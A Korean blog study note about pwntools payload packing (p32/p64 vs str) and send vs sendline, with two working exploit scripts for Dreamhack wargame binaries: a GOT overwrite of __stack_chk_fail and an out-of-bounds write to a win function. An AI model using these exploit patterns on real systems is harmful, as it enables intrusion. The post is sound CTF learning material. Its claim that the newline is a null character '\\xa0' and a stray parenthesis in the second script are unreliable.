---
title: "[pwntools] 페이로드 패킹 및 전송"
description: pwntools로 페이로드 패킹 및 전송할 때 유의 사항
date: 2025-01-31 02:59:00 +0900
categories: [Security, System Hacking]
tags: [pwntools]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false  
---

---
패킹 때문에 오늘 하루를 꼬박 날려서 정리해둔다   
예전에도 `send`랑 `sendline` 때문에 못 풀었던 적이 있어서 같이 정리하기로 했다   

pwntools 파이썬 모듈에는 `p32`, `p64` 함수가 존재한다   
간단하게 이분법적으로 생각하면 문자열 자체를 입력할 때에는 `str()` 함수를 사용하고 메모리 주소를 입력할 때에는 `p32` 또는 `p64` 함수를 사용한다   

근데 이렇게만 생각했다가 오늘 시간을 잡아먹혔기 때문에 무조건적이라 생각하면 안 된다..  
<br> 
   
---

## **p64 vs p32**

둘 다 패킹 함수이지만 저장할 데이터 크기가 다르다

### p64 

64비트 즉, 8바이트 패킹에 사용된다   
데이터를 리틀 엔디언으로 변환하는데 주로 64비트 시스템에서 메모리 주소를 조작할 때 사용된다   

```python
print(p64(0x12345678abcdef01))
print(u64(b'\x01\xef\xcd\xab\x78\x56\x34\x12'))
```

```python
b'\x01\xef\xcd\xab\x78\x56\x34\x12'
1311768467750121217
```

참고로 `e.got['printf']`, `e.sym['get_shell']` 등으로 찾은 심볼은 정수 형태이므로 리틀 엔디안으로 입력할 경우 `p64` 함수로 패킹이 필요하다   
 
### p32

32비트 즉, 4바이트 데이터 패킹에 사용된다   
리틀 엔디언으로 변환하며 32비트 시스템에서 주로 사용된다     
<br> 

---

## **str vs p64 / p32**

[Dreamhack 32](https://dreamhack.io/wargame/challenges/32)


```c
int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}
```

임의의 주소값에 원하는 값을 대입할 수 있는 바이너리이다   
`buf` 입력을 0x80만큼 받기 때문에 버퍼 오버플로우가 발생할 수도 있어 return 주소를 `get_shell` 함수의 주소로 바꾸어 풀이할 수도 있을 것 같다   
`system` 함수가 실행되도록 movaps도 같이 신경 써주면 풀릴 것 같지만 직접 해보지 않았다..  
<br> 

---

![External Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FCx0D8%2FbtsL2dszNR8%2FVyAXeXDSYkUaeedN9dIG61%2Fimg.png)

카나리 값이 어긋나면 `__stack_chk_fail` 을 호출하기 때문에 `__stack_chk_fail`의 GOT를 `get_shell` 주소로 덮어씌워 풀이했다  
<br> 

---

```python
from pwn import *

port = 00000
p = process('./ssp_000')
p = remote('host1.dreamhack.games', port)
e = ELF('./ssp_000', checksec = False)

# context.log_level = 'debug'

payload = b'A' * 0x4a

p.send(payload)
p.sendlineafter(b'Addr : ', str(e.got['__stack_chk_fail']))
p.sendlineafter(b'Value : ', str(e.sym['get_shell']))

p.interactive()
```

메모리 주소는 `p64`, 문자열 전달은 `str`이라는 이분법적 사고에 사로잡혀 있어서 못 풀고 있었다..   
본 문제에서는 주소와 값을 `%ld`로 그대로 전달 받기 때문에 모두 `str`로 묶어서 별다른 패킹 없이 전달해줘야 한다  
<br> 
   
---

[Dreamhack 1617](https://dreamhack.io/wargame/challenges/1617)
![External Image](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnuGMW%2FbtsL3jlrXzc%2FvZs8lHE3Itp7LDPFfYe5EK%2Fimg.png)

Out of Bound로 푸는 문제다  
<br> 

---

```python
from pwn import *

p = process('./prob')
p = remote('host1.dreamhack.games', 17260)
e = ELF('./prob', checksec = False)

p.sendlineafter(b'val: ', b'-15'))
p.sendlineafter(b'val: ', str(e.sym['win']).encode())

p.interactive()
```

`buf`의 인덱스에 값이 `%lu`로 들어가는 것이기에 패킹을 하면 안 된다

바보 같은 나는 메모리 주소는 무조건 패킹이라 생각하고 `p64` 씌워놓고 왜 안 되지 하면서 무한 삽질 중이었다..   
아무튼 이렇게 값이 어떻게 전달되는지 확실하게 확인하고 패킹을 씌울지 말지 정해야 한다  
<br> 

---

## **send / sendline**

처음 로드맵 따라갈 때 이것 때문에 애를 좀 먹었다   
지금은 잘 알고 쓰고 있지만 그냥 같이 정리해본다   

`scanf` 또는 `read` 함수 등에 값을 입력할 때 사용자는 입력을 완료하기 위해 엔터를 눌러 널 문자(\\xa0)로 문자열의 종료를 알린다   
이때 `scanf`는 널 문자를 버리지만 `read`는 널 문자까지 받아버린다

`send` 함수는 인자 그대로 전송하고, sendline 함수는 인자에 널 문자를 붙여서 보낸다   
그래서 `read` 함수에 `sendline`으로 페이로드나 메모리 주소를 전달하면 널 문자가 포함되어 원하는대로 동작이 실행되지 않을 수도 있다   
특히 카나리에 덮어씌울 때 조심해야 한다

이제 막 시스템 해킹 로드맵을 끝내서 후에 예외가 발생할 지는 아직 모르겠지만 현재로서는 `read` 함수에는 `send`, `scanf` 함수에는 `sendline`을 사용하고 있다